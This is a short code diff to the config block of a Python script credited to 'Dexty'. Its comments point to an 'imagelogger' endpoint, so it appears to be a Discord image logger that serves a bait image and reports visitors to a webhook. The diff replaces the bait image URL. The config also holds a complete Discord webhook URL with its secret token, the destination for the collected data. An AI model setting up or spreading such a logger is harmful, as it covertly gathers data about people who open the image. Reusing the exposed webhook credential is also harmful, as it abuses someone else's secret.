@@ -14,7 +14,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1401557914602442913/X83bZ-yN4vFatyNqJbSYKIua7a7mGZcqj1y-L0Fa1yRrMFhUxP_iqQFRV8rIw5dGUCZi",
-    "image": "https://cdn.vox-cdn.com/thumbor/YFPSLYziAQUnNnjLg4KRQ5Nv0sM=/0x0:5015x3343/1200x800/filters:focal(2617x820:3419x1622)/cdn.vox-cdn.com/uploads/chorus_image/image/68930044/usa_today_15444816.0jpg", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.pixabay.com/photo/2017/01/31/14/56/poop-2024794_640.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
